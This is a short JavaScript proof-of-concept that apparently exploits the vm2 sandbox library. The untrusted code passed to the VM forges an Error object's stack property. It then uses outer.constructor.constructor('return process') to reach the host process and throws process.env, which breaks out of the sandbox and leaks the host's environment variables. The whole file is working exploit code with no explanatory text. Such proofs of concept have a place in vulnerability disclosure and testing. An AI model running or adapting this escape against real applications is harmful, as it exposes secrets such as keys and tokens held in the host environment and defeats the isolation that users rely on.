const {VM} = require('vm2');
const untrusted = '(' + function(){
	const bad = new Error();
	bad.__proto__ = null;
	bad.stack = {
			startsWith(){
				return true;
			},
			length: 5,
			match(outer){
				throw outer.constructor.constructor("return process")().env;
			}
	};
	return bad;
}+')()';
try{
	console.log(new VM().run(untrusted));
}catch(x){
	console.log(x);
}
